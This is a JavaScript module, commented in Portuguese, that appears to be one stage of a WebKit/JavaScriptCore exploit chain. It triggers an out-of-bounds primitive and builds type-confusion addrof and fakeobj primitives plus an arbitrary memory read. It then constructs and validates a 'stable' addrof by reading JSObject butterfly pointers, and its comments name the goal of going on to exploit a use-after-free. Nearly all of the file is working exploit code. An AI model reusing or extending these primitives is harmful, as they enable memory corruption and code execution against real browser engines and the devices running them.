// js/script3/testArrayBufferVictimCrash.mjs (v108 - R94 - AddrOf via Arbitrary R/W)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA:
// 1. A primitiva `addrof` direta se mostrou instável.
// 2. NOVA ABORDAGEM: Usar a primitiva estável de Leitura/Escrita (R/W) para construir
//    uma nova primitiva `addrof` robusta (`addrof_via_rw`).
// 3. OBJETIVO: Obter uma `addrof` 100% confiável para, finalmente, voltar a explorar o UAF.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    getOOBDataView
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v108_R94_AddrOf_via_RW";

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Construindo AddrOf via Leitura/Escrita ---`, "test");

    let final_result = { success: false, message: "Falha na construção da primitiva." };

    try {
        logS3("--- FASE 1: Obtendo primitiva OOB... ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true });
        if (!getOOBDataView()) { throw new Error("Falha ao obter primitiva OOB."); }
        logS3("OOB DataView obtido com sucesso.", "info");

        // --- FASE 2: Criando as primitivas de base (R/W arbitrária) ---
        logS3("--- FASE 2: Criando as primitivas de base (R/W estável) ---", "subtest");

        const one_shot_confused = [13.37];
        const one_shot_victim = [{ a: 1 }];

        const addrof_onetime = (obj) => {
            one_shot_victim[0] = obj;
            return doubleToInt64(one_shot_confused[0]);
        };
        const fakeobj_onetime = (addr) => {
            one_shot_confused[0] = int64ToDouble(addr);
            return one_shot_victim[0];
        };
        
        const leaker = { obj_prop: null, val_prop: 0 };
        const arb_read_final = (addr) => {
            leaker.obj_prop = fakeobj_onetime(addr);
            return doubleToInt64(leaker.val_prop);
        };
        logS3("Primitiva de Leitura Arbitrária estável (`arb_read_final`) está pronta.", "good");

        // --- FASE 3: Construindo e Validando a nova `addrof_via_rw` ---
        logS3("--- FASE 3: Construindo e Validando a nova `addrof_via_rw` ---", "subtest");
        
        const BUTTERFLY_OFFSET = JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET;
        if (BUTTERFLY_OFFSET === 0) { throw new Error("Offset JSObject_BUTTERFLY_OFFSET é necessário e não foi encontrado."); }
        
        // Esta é a nossa nova primitiva `addrof` robusta.
        const addrof_via_rw = (object_to_find) => {
            const container = [object_to_find];
            const container_addr = addrof_onetime(container);
            
            // Lê o ponteiro para o butterfly (armazenamento de elementos) do objeto 'container'.
            const butterfly_ptr = arb_read_final(container_addr.add(BUTTERFLY_OFFSET));
            
            // Lê o primeiro elemento do butterfly, que é o ponteiro para o nosso 'object_to_find'.
            const object_addr = arb_read_final(butterfly_ptr);
            
            return object_addr;
        };
        logS3("Nova primitiva `addrof_via_rw` construída.", "info");

        logS3("  [VALIDAÇÃO 1/3] Testando `addrof_via_rw` em um objeto inicial...", "info");
        const obj1 = { test_id: 1 };
        const addr1 = addrof_via_rw(obj1);
        logS3(`  Endereço de obj1: ${addr1.toString(true)}`, "leak");
        if(addr1.equals(AdvancedInt64.Zero)){ throw new Error("addrof_via_rw retornou zero para o primeiro objeto."); }

        logS3("  [VALIDAÇÃO 2/3] Agitando o heap...", "info");
        let churn = [];
        for (let i = 0; i < 20000; i++) {
            churn.push(new Array(Math.floor(Math.random() * 10) + 1));
        }
        churn = [];
        await PAUSE_S3(1000);

        logS3("  [VALIDAÇÃO 3/3] Testando `addrof_via_rw` em um novo objeto pós-agitação...", "info");
        const obj2 = { test_id: 2 };
        const addr2 = addrof_via_rw(obj2);
        logS3(`  Endereço de obj2: ${addr2.toString(true)}`, "leak");
        if(addr2.equals(AdvancedInt64.Zero)){ throw new Error("addrof_via_rw retornou zero para o segundo objeto."); }

        if (addr1.equals(addr2)) {
            logS3("  FALHA CATASTRÓFICA: A nova `addrof_via_rw` ainda é instável.", "critical");
            throw new Error("Falha ao estabilizar a primitiva addrof com a nova técnica.");
        } else {
            logS3("  ++++++++ SUCESSO TOTAL! A primitiva `addrof_via_rw` é ESTÁVEL! ++++++++", "vuln");
            logS3("  Com esta ferramenta, agora podemos retornar à exploração do UAF.", "good");
            final_result.success = true;
            final_result.message = "Primitiva addrof robusta construída e validada com sucesso.";
        }

    } catch (e) {
        final_result.message = `Exceção na construção da primitiva: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
        final_result.success = false;
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: { success: final_result.success, msg: final_result.message },
    };
}
